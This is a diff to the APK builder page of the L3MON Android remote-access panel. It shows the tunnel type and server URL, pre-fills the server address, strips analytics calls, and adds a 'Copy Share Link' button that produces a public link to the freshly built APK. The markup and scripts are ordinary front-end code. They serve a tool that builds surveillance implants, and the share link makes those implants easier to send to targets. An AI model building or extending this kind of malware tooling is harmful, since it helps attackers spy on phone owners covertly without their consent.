@@ -14,6 +14,15 @@
             </div>
 
             <h1 class="ui" style="text-align: center">APK Builder</h1>
+
+            <!-- Tunnel Info Banner -->
+            <div class="ui info message" style="text-align:center;">
+                <i class="wifi icon"></i>
+                Connection Mode: <strong><%= tunnelType.toUpperCase() %></strong>
+                &nbsp;|&nbsp;
+                Server URL: <strong><%= myUrl %>:<%= myPort %></strong>
+            </div>
+
             <div class="ui form" id="form">
                 <div class="inline fields">
                     <div class="six wide field">
@@ -22,7 +31,8 @@
                                 http://
                             </div>
                             <input type="text" id="uriInput" placeholder="IP / Public URL"
-                                title="This is the public url of your server (l3mon.domain.com)">
+                                title="This is the public url of your server"
+                                value="<%= myUrl %>">
                         </div>
                     </div>
                     <div class="two wide field">
@@ -34,16 +44,29 @@
                 </div>
                 <div class="inline fields">
                     <div class="eight wide field">
-                        <button id="gobuild" class="positive ui fluid button"><i class="wrench icon"></i>Build</button>
+                        <button id="gobuild" class="positive ui fluid button"><i class="wrench icon"></i>Build APK</button>
                     </div>
                 </div>
             </div>
 
             <div class="ui form" id="download" style="display: none">
                 <div class="inline fields">
-                    <div class="eight wide field">
-                        <a class="blue ui fluid button" download="L3MON.apk" href="/build.s.apk"><i
-                                class="download icon"></i>Download</a>
+                    <div class="five wide field">
+                        <a class="blue ui fluid button" download="L3MON.apk" href="/build.apk">
+                            <i class="download icon"></i>Download APK
+                        </a>
+                    </div>
+                    <div class="five wide field">
+                        <button class="teal ui fluid button" id="shareLinkBtn" onclick="copyShareLink()">
+                            <i class="share alternate icon"></i>Copy Share Link
+                        </button>
+                    </div>
+                </div>
+                <div class="inline fields" id="shareLinkBox" style="display:none; margin-top:8px;">
+                    <div class="ten wide field">
+                        <div class="ui fluid input">
+                            <input type="text" id="shareLinkInput" readonly value="" style="font-size:12px;">
+                        </div>
                     </div>
                 </div>
             </div>
@@ -57,10 +80,8 @@
     </style>
 
     <script>
-        gtag('event', 'screen_view', {
-            'screen_name': 'apkBuilder',
-            'app_name': 'L3MON'
-        });
+        var tunnelType = '<%= tunnelType %>';
+        var panelUrl = '<%= panelUrl %>';
 
         var loadingTexts = [
             "Decompiling APK",
@@ -74,6 +95,7 @@
         var loadingIndex = 0;
         var isDone = false;
         var isDoneInterval;
+
         $('#gobuild').click((e) => {
             $('#dimmer').addClass('active');
             build($('#uriInput').val(), $('#portInput').val());
@@ -93,20 +115,34 @@
                         $('#download').removeClass('active');
                     })
                     $('#form').fadeOut(500, () => {
+                        // Set share link
+                        var shareUrl = panelUrl + '/build.apk';
+                        document.getElementById('shareLinkInput').value = shareUrl;
                         $('#download').fadeIn(200);
-                    })
+                    });
                 }
             }, 100);
         }
 
-        function build(URI, PORT) {
-            gtag('event', 'build', {
-                'builduri': URI + ':' + PORT
+        function copyShareLink() {
+            var shareUrl = panelUrl + '/build.apk';
+            document.getElementById('shareLinkInput').value = shareUrl;
+            $('#shareLinkBox').fadeIn(200);
+            navigator.clipboard.writeText(shareUrl).then(function() {
+                showNotification('#27ae60', 'Share link copied to clipboard!');
+            }).catch(function() {
+                showNotification('#e67e22', 'Link shown below - copy manually.');
             });
+        }
+
+        function build(URI, PORT) {
             $.post("/builder?uri=" + URI + "&port=" + PORT, function (data) {
                 if (!data.error) {
-                    isDone = true
-                } else showNotification('#f03434', data.error)
+                    isDone = true;
+                } else {
+                    $('#dimmer').fadeOut(500);
+                    showNotification('#f03434', data.error);
+                }
             });
         }
 
